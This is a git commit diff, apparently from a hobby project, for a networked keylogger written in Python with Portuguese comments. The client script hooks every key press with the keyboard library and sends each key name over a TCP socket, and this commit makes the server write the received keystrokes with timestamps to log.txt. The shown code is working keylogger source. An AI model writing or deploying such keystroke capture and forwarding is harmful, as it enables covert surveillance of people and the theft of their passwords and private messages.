49d4ed251d4b62a4bc765945eed35863ec8e2b04
heitorPrDev <herohecttorplay@gmail.com>
2024-06-30 00:37:51 -0300

    1.5.0-Retoques Finais-

--- mainCliente.py
+++ mainCliente.py
@@ -1,12 +1,15 @@
 
 import keyboard
 import socket
+from time import sleep
 host = 'localhost' # IP do Computador do servidor
 port = 8082 # Porta do computador com servidor
 server = (host,port)
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock.connect(server)
 
+
+    
 def keypress(event):
     if event.name:
         sock.send(bytes(str(event.name), 'utf-8'))
--- server.py
+++ server.py
@@ -14,14 +14,26 @@ sock.listen(1)
 conn, docl = sock.accept()
 
 if docl:
-    print('\033[1;32m='*42)
-    print(f'| servidor iniciado na maquina {docl[0]} |')
-    print('='*42)
+    
+    print(f'\033[1;32m\n  servidor iniciado na maquina {docl[0]}')
+    print('='*45)
     print('\033[m')
+    with open('log.txt', 'a') as cli:
+        cli.write(f'\n  servidor iniciado na maquina {docl[0]}\n{'='*45}\n')
 while True:
-        
-    Menss_Rec = str(conn.recv(1024), 'utf-8')
+    try:
+        Menss_Rec = str(conn.recv(1024), 'utf-8')
 
-    if Menss_Rec:
-        print(f'[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}]\033[1;31m -> \033[m{Menss_Rec}')
+        if Menss_Rec:
+            print(f'[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}]\033[1;31m -> \033[m{Menss_Rec}')
+            with open('log.txt','a') as keys:
+                keys.write(f'\n[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}] -> {Menss_Rec}')
+    except ConnectionResetError:
+        print('\n\033[1;31mhost remoto cancelou a execução\033[m')
+        break
+    except KeyboardInterrupt:
+        print('\n\033[1;31mvocê cancelou a execução\033[m')
+        break
+
+
     
